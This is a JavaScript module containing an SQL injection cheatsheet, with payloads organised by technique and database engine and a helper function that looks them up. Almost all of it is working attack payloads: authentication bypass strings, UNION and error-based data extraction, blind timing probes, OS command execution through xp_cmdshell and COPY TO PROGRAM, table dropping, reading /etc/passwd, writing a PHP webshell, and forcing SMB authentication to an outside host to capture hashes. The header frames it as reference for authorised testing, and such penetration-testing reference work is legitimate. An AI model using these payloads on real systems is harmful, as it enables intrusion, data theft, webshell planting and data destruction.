// SQL injection cheatsheet — payloads grouped by task and DBMS. Reference material for
// testing apps you are authorised to test. {col} / {table} are placeholders to fill in.

export const DBMS = ['MySQL', 'MSSQL', 'PostgreSQL', 'Oracle', 'SQLite'];

// category → { dbms → [ [payload, note], ... ] }  ('*' = works on most)
export const CHEATS = {
  'Authentication bypass': {
    '*': [
      ["' OR '1'='1", 'classic, string context'],
      ["' OR '1'='1'-- -", 'comment out the rest'],
      ["' OR 1=1-- -", ''],
      ["admin'-- -", 'log in as a known user'],
      ["admin'#", 'MySQL comment'],
      ["' OR '1'='1' /*", ''],
      ['" OR "1"="1', 'double-quote context'],
      ["') OR ('1'='1'-- -", 'close a parenthesis'],
    ],
  },
  'Comments': {
    MySQL: [['-- - ', 'note the space/dash after --'], ['#', ''], ['/*comment*/', ''], ['/*!50000SELECT*/', 'version-gated inline, WAF bypass']],
    MSSQL: [['-- -', ''], ['/*comment*/', '']],
    PostgreSQL: [['-- -', ''], ['/*comment*/', '']],
    Oracle: [['-- -', ''], ['/*comment*/', '']],
    SQLite: [['-- -', ''], ['/*comment*/', '']],
  },
  'DB version': {
    MySQL: [['SELECT @@version', ''], ['SELECT version()', '']],
    MSSQL: [['SELECT @@version', ''], ['SELECT SERVERPROPERTY(\'productversion\')', '']],
    PostgreSQL: [['SELECT version()', '']],
    Oracle: [['SELECT banner FROM v$version', ''], ['SELECT * FROM v$version', '']],
    SQLite: [['SELECT sqlite_version()', '']],
  },
  'UNION-based': {
    '*': [
      ["' ORDER BY 1-- -", 'find the column count (increment until error)'],
      ["' UNION SELECT NULL-- -", 'match the column count with NULLs'],
      ["' UNION SELECT NULL,NULL,NULL-- -", ''],
      ["' UNION SELECT 1,2,3-- -", 'find which columns are reflected'],
    ],
    MySQL: [["' UNION SELECT user(),database(),@@version-- -", '']],
    MSSQL: [["' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- -", 'list tables']],
    Oracle: [["' UNION SELECT NULL FROM dual-- -", 'Oracle needs FROM dual']],
  },
  'Enumerate schema': {
    MySQL: [
      ["SELECT table_name FROM information_schema.tables WHERE table_schema=database()", 'tables'],
      ["SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", 'columns'],
      ["SELECT group_concat(table_name) FROM information_schema.tables", 'all tables, one row'],
    ],
    MSSQL: [["SELECT name FROM sysobjects WHERE xtype='U'", 'tables'], ["SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')", 'columns']],
    PostgreSQL: [["SELECT table_name FROM information_schema.tables", 'tables'], ["SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", 'columns']],
    Oracle: [["SELECT table_name FROM all_tables", 'tables'], ["SELECT column_name FROM all_tab_columns WHERE table_name='{table}'", 'columns']],
    SQLite: [["SELECT name FROM sqlite_master WHERE type='table'", 'tables'], ["SELECT sql FROM sqlite_master WHERE name='{table}'", 'columns (from the CREATE statement)']],
  },
  'Error-based': {
    MySQL: [["' AND extractvalue(1,concat(0x7e,(SELECT {col} FROM {table} LIMIT 1)))-- -", 'XPATH error leaks data'], ["' AND updatexml(1,concat(0x7e,version()),1)-- -", '']],
    MSSQL: [["' AND 1=CONVERT(int,(SELECT TOP 1 {col} FROM {table}))-- -", 'conversion error leaks data']],
    PostgreSQL: [["' AND 1=CAST((SELECT {col} FROM {table} LIMIT 1) AS int)-- -", '']],
    Oracle: [["' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT {col} FROM {table} WHERE ROWNUM=1))-- -", '']],
  },
  'Blind — boolean': {
    '*': [["' AND 1=1-- -", 'true condition'], ["' AND 1=2-- -", 'false condition'], ["' AND SUBSTRING((SELECT {col} FROM {table} LIMIT 1),1,1)='a'-- -", 'test a character']],
  },
  'Blind — time delay': {
    MySQL: [["' AND SLEEP(5)-- -", ''], ["' AND IF(1=1,SLEEP(5),0)-- -", 'conditional delay']],
    MSSQL: [["'; WAITFOR DELAY '0:0:5'-- -", '']],
    PostgreSQL: [["' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -", ''], ["'; SELECT PG_SLEEP(5)-- -", '']],
    Oracle: [["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", '']],
    SQLite: [["' AND 1=(SELECT 1 FROM (WITH RECURSIVE c(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM c WHERE x<5000000) SELECT 1))-- -", 'heavy query delay']],
  },
  'Stacked queries': {
    MSSQL: [["'; EXEC xp_cmdshell 'whoami'-- -", 'command exec if xp_cmdshell is on'], ["'; DROP TABLE {table}-- -", '']],
    PostgreSQL: [["'; COPY (SELECT '') TO PROGRAM 'id'-- -", 'command exec via COPY'], ["'; CREATE TABLE x(y text)-- -", '']],
    MySQL: [['Stacked queries rarely work through mysql_query() in PHP', '']],
  },
  'Read / write files': {
    MySQL: [["' UNION SELECT LOAD_FILE('/etc/passwd')-- -", 'read (needs FILE priv)'], ["' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'-- -", 'write a webshell']],
    MSSQL: [["'; EXEC master..xp_dirtree '\\\\HOST\\share'-- -", 'force a SMB auth (NetNTLM capture)']],
    PostgreSQL: [["' UNION SELECT pg_read_file('/etc/passwd')-- -", 'read a file']],
  },
};

export const CATEGORIES = Object.keys(CHEATS);

export function rows(category, dbms) {
  const block = CHEATS[category] || {};
  const list = [...(block['*'] || []), ...(block[dbms] || [])];
  return list;
}
